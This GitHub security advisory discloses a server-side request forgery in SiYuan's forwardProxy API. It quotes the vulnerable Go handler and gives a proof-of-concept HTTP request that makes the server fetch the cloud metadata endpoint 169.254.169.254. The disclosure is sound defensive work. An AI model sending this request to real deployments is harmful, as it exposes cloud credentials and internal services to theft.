# [H] SiYuan has a Full-Read SSRF via /api/network/forwardProxy

## Summary
Severity: High
Advisory: GHSA-56cv-c5p2-j2wg
CVE: CVE-2026-32110
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-03-12
Source: https://github.com/advisories/GHSA-56cv-c5p2-j2wg
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <3.6.0

## Details
### Summary
The `/api/network/forwardProxy` endpoint allows authenticated users to make arbitrary HTTP requests from the server. The endpoint accepts a user-controlled URL and makes HTTP requests to it, returning the full response body and headers. There is no URL validation to prevent requests to internal networks, localhost, or cloud metadata services.

### Affected Code
File: `/kernel/api/network.go` (Lines `153-317`)
```
func forwardProxy(c *gin.Context) {
    ret := gulu.Ret.NewResult()
    defer c.JSON(http.StatusOK, ret)

    arg, ok := util.JsonArg(c, ret)
    if !ok {
        return
    }

    destURL := arg["url"].(string)
    // VULNERABILITY: Only validates URL format, not destination
    if _, e := url.ParseRequestURI(destURL); nil != e {
        ret.Code = -1
        ret.Msg = "invalid [url]"
        return
    }

    // ... HTTP request is made to user-controlled URL ...
    resp, err := request.Send(method, destURL)
    
    // Full response body is returned to the user
    bodyData, err := io.ReadAll(resp.Body)
    // ...
    ret.Data = data  // Contains full response body
}
```
### PoC
- First, authenticate with your access auth code and copy the authenticated cookie.
- Now use the request below for SSRF to Access Cloud Metadata.
```
POST /api/network/forwardProxy HTTP/1.1
Host: <HOST>
Cookie: siyuan=<COOKIE>
Content-Length: 102

{"url":"http://169.254.169.254/metadata/v1/","method":"GET","headers":[],"payload":"","timeout":7000}'
```
<img width="1230" height="754" alt="Screenshot 2026-03-11 at 1 23 36 AM" src="https://github.com/user-attachments/assets/60486dba-1ccd-4287-8073-b803854756a2" />

### Impact
- Internal Network Reconnaissance: Attackers can scan internal services
- Cloud Credential Theft: Potential access to cloud metadata and IAM credentials
- Data Exfiltration: Server can be used as a proxy to access internal resources
- Firewall Bypass: Requests originate from trusted internal IP

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-56cv-c5p2-j2wg
- https://nvd.nist.gov/vuln/detail/CVE-2026-32110
- https://github.com/siyuan-note/siyuan
